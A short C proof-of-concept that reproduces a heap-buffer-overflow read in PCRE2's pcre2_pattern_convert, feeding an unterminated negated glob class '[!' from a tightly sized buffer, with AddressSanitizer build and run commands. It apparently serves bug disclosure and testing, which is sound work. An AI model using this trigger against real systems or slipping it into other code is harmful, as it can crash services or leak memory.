/* PoC: heap-buffer-overflow (read) in pcre2_pattern_convert when a glob
   pattern ends immediately after a negated class introducer ("[!" or "[^").

   Public API, in-contract input: a length-delimited pattern that is a
   syntactically invalid (unterminated) glob class. The documented behaviour is
   to return PCRE2_ERROR_MISSING_SQUARE_BRACKET; it must not read past the
   caller-supplied buffer.

   The pattern is placed in a tightly sized heap allocation (no NUL terminator)
   so AddressSanitizer observes the out-of-bounds read.

   Build (against the ASAN library built in this tree):
     cc -g -fsanitize=address -I../src residual.c ../.libs/libpcre2-8.a -o residual
   Run:
     ./residual
*/

#include <stdlib.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(void)
{
PCRE2_SIZE plen = 2;
PCRE2_UCHAR *pattern = (PCRE2_UCHAR *)malloc(plen);
PCRE2_UCHAR *converted = NULL;
PCRE2_SIZE blen = 0;
int rc;

memcpy(pattern, "[!", plen);

rc = pcre2_pattern_convert(pattern, plen,
  PCRE2_CONVERT_GLOB | PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR,
  &converted, &blen, NULL);

if (converted != NULL) pcre2_converted_pattern_free(converted);
free(pattern);
return rc;
}
